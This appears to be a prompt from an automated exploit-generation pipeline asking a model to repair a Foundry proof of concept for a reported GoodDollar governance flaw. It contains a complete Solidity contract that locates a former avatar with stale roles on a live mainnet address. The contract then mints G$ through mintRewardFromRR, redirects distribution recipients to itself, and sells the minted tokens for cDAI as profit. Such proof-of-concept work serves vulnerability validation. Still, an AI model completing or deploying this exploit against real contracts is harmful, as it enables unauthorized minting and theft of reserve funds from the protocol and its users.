You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Governance rotation leaves former avatar with permanent reserve minting and helper admin powers
- claim: `GoodReserveCDai` and `DistributionHelper` snapshot the current `avatar` into `AccessControl` roles during initialization, but those roles are never revoked or automatically reassigned when `Controller.avatar()` changes. After governance rotation, the former avatar still keeps `RESERVE_MINTER_ROLE` on the reserve and `DEFAULT_ADMIN_ROLE` on the helper.
- impact: A stale governance key can continue minting G$ through `mintRewardFromRR` and can still reconfigure distribution recipients. Rotating governance therefore does not actually remove protocol control from the old avatar, enabling unauthorized inflation, value extraction, and long-lived control over where future distributions are sent.
- exploit_paths: ["DAO governance rotates `Controller.avatar()` to a new address", "The old avatar retains `RESERVE_MINTER_ROLE` in `GoodReserveCDai` and `DEFAULT_ADMIN_ROLE` in `DistributionHelper`", "The old avatar calls `mintRewardFromRR(...)` to mint G$ to itself and monetizes the new supply through the reserve/exchange flow", "The old avatar also calls `addOrUpdateRecipient(...)` to redirect future distributions"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetFundManager {
    function nameService() external view returns (address);
    function dao() external view returns (address);
}

interface INameServiceLike {
    function getAddress(string calldata name) external view returns (address);
}

interface ControllerLike {
    function avatar() external view returns (address);
    function genericCall(
        address _contract,
        bytes calldata _data,
        address _avatar,
        uint256 _value
    ) external returns (bool, bytes memory);
}

interface IAvatarLike {
    function owner() external view returns (address);
}

interface IAccessControlEnumerableLike {
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
}

interface IMarketMakerLike {
    function sellReturn(address _token, uint256 _gdAmount) external view returns (uint256);
}

interface GoodReserveCDai is IAccessControlEnumerableLike {
    function cDaiAddress() external view returns (address);
    function distributionHelper() external view returns (address);
    function getMarketMaker() external view returns (address);
    function cap() external view returns (uint256);
    function mintRewardFromRR(address _token, address _to, uint256 _amount) external;
    function sell(
        uint256 _gdAmount,
        uint256 _minReturn,
        address _target,
        address _seller
    ) external returns (uint256, uint256);
}

interface DistributionHelper is IAccessControlEnumerableLike {
    struct DistributionRecipient {
        uint32 bps;
        uint32 chainId;
        address addr;
        uint8 transferType;
    }

    function addOrUpdateRecipient(DistributionRecipient calldata _recipient) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;

    bytes32 internal constant RESERVE_MINTER_ROLE = keccak256("RESERVE_MINTER_ROLE");
    bytes32 internal constant DEFAULT_ADMIN_ROLE = 0x00;
    uint8 internal constant TRANSFER_TYPE_CONTRACT = 3;

    address internal _profitToken;
    uint256 internal _profitAmount;

    error MissingNameService();
    error MissingController();
    error MissingReserve();
    error MissingHelper();
    error MissingGoodDollar();
    error MissingCDai();
    error StaleAvatarNotFound();
    error RemainingCapExhausted();
    error MintFailed();
    error RedirectFailed();
    error MintDidNotProduceGd();
    error SellDidNotProduceProfit();

    constructor() {}

    receive() external payable {}

    function onTokenTransfer(address, uint256, bytes calldata) external pure returns (bool) {
        return true;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        address nameService = ITargetFundManager(TARGET).nameService();
        if (nameService == address(0)) revert MissingNameService();

        address controllerAddress = INameServiceLike(nameService).getAddress("CONTROLLER");
        if (controllerAddress == address(0)) {
            controllerAddress = ITargetFundManager(TARGET).dao();
        }
        if (controllerAddress == address(0)) revert MissingController();
        ControllerLike controller = ControllerLike(controllerAddress);

        address reserveAddress = INameServiceLike(nameService).getAddress("RESERVE");
        if (reserveAddress == address(0)) revert MissingReserve();
        GoodReserveCDai goodReserveCDai = GoodReserveCDai(reserveAddress);

        address helperAddress = goodReserveCDai.distributionHelper();
        if (helperAddress == address(0)) {
            helperAddress = INameServiceLike(nameService).getAddress("DISTRIBUTION_HELPER");
        }
        if (helperAddress == address(0)) revert MissingHelper();
        DistributionHelper distributionHelper = DistributionHelper(helperAddress);

        address goodDollar = INameServiceLike(nameService).getAddress("GOODDOLLAR");
        if (goodDollar == address(0)) revert MissingGoodDollar();

        address cDai = goodReserveCDai.cDaiAddress();
        if (cDai == address(0)) {
            cDai = INameServiceLike(nameService).getAddress("CDAI");
        }
        if (cDai == address(0)) revert MissingCDai();

        uint256 gdBefore = IERC20Like(goodDollar).balanceOf(address(this));
        uint256 cdaiBefore = IERC20Like(cDai).balanceOf(address(this));

        // exploit_paths[0]:
        // governance rotates controller.avatar() to a new address, but stale role grants remain
        // on GoodReserveCDai and DistributionHelper.
        address currentAvatar = controller.avatar();
        address staleAvatar = _findFormerAvatar(goodReserveCDai, distributionHelper, currentAvatar);
        if (staleAvatar == address(0)) revert StaleAvatarNotFound();

        uint256 mintAmount = _selectMintAmount(goodReserveCDai, cDai, goodDollar);
        if (mintAmount == 0) revert RemainingCapExhausted();

        // exploit_paths[1] + exploit_paths[2]:
        // the former avatar still controls GoodReserveCDai.mintRewardFromRR(...) and can mint
        // fresh G$ to this contract, which is then sold through the live reserve for pre-existing cDAI.
        if (!_mintRewardFromRR(controller, staleAvatar, goodReserveCDai, cDai, mintAmount)) {
            revert MintFailed();
        }

        // exploit_paths[3]:
        // the same stale avatar keeps DistributionHelper DEFAULT_ADMIN_ROLE and can redirect
        // future distributions to an attacker-controlled recipient.
        if (!_addOrUpdateRecipient(controller, staleAvatar, distributionHelper)) {
            revert RedirectFailed();
        }

        uint256 gdAfter = IERC20Like(goodDollar).balanceOf(address(this));
        if (gdAfter <= gdBefore) revert MintDidNotProduceGd();

        IERC20Like(goodDollar).approve(reserveAddress, type(uint256).max);
        goodReserveCDai.sell(gdAfter - gdBefore, 0, address(this), address(this));

        uint256 realized = IERC20Like(cDai).balanceOf(address(this)) - cdaiBefore;
        if (realized == 0) revert SellDidNotProduceProfit();

        _profitToken = cDai;
        _profitAmount = realized;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findFormerAvatar(
        GoodReserveCDai goodReserveCDai,
        DistributionHelper distributionHelper,
        address currentAvatar
    ) internal view returns (address) {
        uint256 reserveCount = goodReserveCDai.getRoleMemberCount(RESERVE_MINTER_ROLE);
        uint256 helperCount = distributionHelper.getRoleMemberCount(DEFAULT_ADMIN_ROLE);

        for (uint256 i = 0; i < reserveCount; ++i) {
            address reserveMember = goodReserveCDai.getRoleMember(RESERVE_MINTER_ROLE, i);
            if (reserveMember == address(0) || reserveMember == currentAvatar) {
                continue;
            }

            for (uint256 j = 0; j < helperCount; ++j) {
                if (distributionHelper.getRoleMember(DEFAULT_ADMIN_ROLE, j) == reserveMember) {
                    return reserveMember;
                }
            }
        }

        return address(0);
    }

    function _mintRewardFromRR(
        ControllerLike controller,
        address staleAvatar,
        GoodReserveCDai goodReserveCDai,
        address cDai,
        uint256 mintAmount
    ) internal returns (bool) {
        bytes memory data =
            abi.encodeCall(GoodReserveCDai.mintRewardFromRR, (cDai, address(this), mintAmount));
        return _genericCallThroughKnownController(controller, staleAvatar, address(goodReserveCDai), data);
    }

    function _addOrUpdateRecipient(
        ControllerLike controller,
        address staleAvatar,
        DistributionHelper distributionHelper
    ) internal returns (bool) {
        DistributionHelper.DistributionRecipient memory recipient = DistributionHelper
            .DistributionRecipient({
                bps: 1,
                chainId: 1,
                addr: address(this),
                transferType: TRANSFER_TYPE_CONTRACT
            });

        bytes memory data =
            abi.encodeCall(DistributionHelper.addOrUpdateRecipient, (recipient));
        return _genericCallThroughKnownController(controller, staleAvatar, address(distributionHelper), data);
    }

    function _selectMintAmount(
        GoodReserveCDai goodReserveCDai,
        address cDai,
        address goodDollar
    ) internal view returns (uint256) {
        uint256 totalSupply = IERC20Like(goodDollar).totalSupply();
        uint256 cap = goodReserveCDai.cap();
        if (cap <= totalSupply) {
            return 0;
        }

        uint256 remainingCap = cap - totalSupply;
        uint256 reserveBalance = IERC20Like(cDai).balanceOf(address(goodReserveCDai));
        address marketMaker = goodReserveCDai.getMarketMaker();

        uint256 targetCdaiOut = reserveBalance / 1000;
        if (targetCdaiOut == 0) {
            targetCdaiOut = 1;
        }

        uint256 low = 1;
        uint256 high = 1e6;
        while (
            high < remainingCap &&
            IMarketMakerLike(marketMaker).sellReturn(cDai, high) < targetCdaiOut
        ) {
            low = high;
            high <<= 1;
        }

        if (high > remainingCap) {
            high = remainingCap;
        }

        for (uint256 i = 0; i < 32 && low + 1 < high; ++i) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quote = IMarketMakerLike(marketMaker).sellReturn(cDai, mid);
            if (quote >= targetCdaiOut) {
                high = mid;
            } else {
                low = mid;
            }
        }

        return high;
    }

    function _genericCallThroughKnownController(
        ControllerLike controller,
        address avatar,
        address target,
        bytes memory data
    ) internal returns (bool) {
        address ownerController = address(0);
        if (avatar.code.length != 0) {
            ownerController = _safeOwner(avatar);
        }

        if (_tryGenericCall(ownerController, target, data, avatar)) {
            return true;
        }

        if (address(controller) != ownerController) {
            return _tryGenericCall(address(controller), target, data, avatar);
        }

        return false;
    }

    function _safeOwner(address avatar) internal view returns (address owner) {
        (bool ok, bytes memory data) = avatar.staticcall(abi.encodeCall(IAvatarLike.owner, ()));
        if (ok && data.length >= 32) {
            owner = abi.decode(data, (address));
        }
    }

    function _tryGenericCall(
        address controller,
        address target,
        bytes memory data,
        address avatar
    ) internal returns (bool) {
        if (controller.code.length == 0) {
            return false;
        }

        (bool ok, bytes memory ret) = controller.call(
            abi.encodeCall(ControllerLike.genericCall, (target, data, avatar, 0))
        );
        if (!ok || ret.length < 64) {
            return false;
        }

        (bool success, ) = abi.decode(ret, (bool, bytes));
        return success;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
